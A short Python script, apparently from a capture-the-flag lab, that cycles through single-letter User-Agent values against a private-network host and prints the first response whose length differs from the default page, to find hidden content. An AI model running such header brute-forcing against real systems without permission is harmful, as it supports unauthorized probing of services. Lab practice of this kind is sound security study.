#!/usr/bin/env python3

import requests
import string

uRL = "http://10.10.95.209/"
code_name = string.ascii_letters
for ua in code_name:
    header = {'User-Agent': ua}
    r = requests.get(uRL, headers=header)
    if (len(r.text) != 218):
        print(f"[+] agent:{ua} Found Something : {r.text}")
        break
